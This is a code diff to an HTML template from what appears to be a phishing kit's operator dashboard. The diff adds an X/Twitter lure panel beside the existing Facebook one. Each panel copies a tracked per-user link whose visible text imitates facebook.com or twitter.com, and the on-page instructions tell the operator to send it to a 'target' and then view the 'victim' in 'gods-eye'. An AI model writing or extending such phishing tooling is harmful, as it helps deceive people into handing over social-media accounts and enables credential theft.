@@ -1,26 +1,49 @@
 <div class="content-inner">
     <div class="facebook">
-
         <div class="icon">
             <i class="fa-brands fa-facebook"></i>
         </div>
 
         <!-- Copy URL Button -->
         <div class="url">
-            <button onclick="copyURL()"><i class="fa-solid fa-link"></i> Copy URL</button>
-            <a href="/facebook?userId=<%= userId %>">https//www.facebook.com</a>
+            <button onclick="copyURL('/facebook?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy FB URL
+            </button>
+            <a href="/facebook?userId=<%= userId %>">https://www.facebook.com</a>
         </div>
 
-        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits in check your
-            gods-eye(view-victim) </p>
+        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your gods-eye (view-victim).</p>
     </div>
 
+
+
+
+
+
+    <div class="twitter">
+        <div class="icon">
+            <i class="fa-brands fa-x-twitter"></i>
+        </div>
+
+        <!-- Copy URL Button -->
+        <div class="url">
+            <button onclick="copyURL('/twitter?userId=<%= userId %>')">
+                <i class="fa-solid fa-link"></i> Copy X URL
+            </button>
+            <a href="/twitter?userId=<%= userId %>">https://www.twitter.com</a>
+        </div>
+
+        <p><strong>Instruction:</strong> Copy the link and send it to your target, when the target hits it, check your gods-eye (view-victim).</p>
+    </div>
 </div>
+
 <script>
-    function copyURL() {
-        const url = window.location.origin + '/facebook?userId=<%= userId %>';
+    function copyURL(route) {
+        const url = window.location.origin + route; // Construct the full URL based on the route parameter
         navigator.clipboard.writeText(url).then(() => {
             alert('URL copied to clipboard!');
+        }).catch(err => {
+            console.error('Failed to copy URL:', err);
         });
     }
 </script>
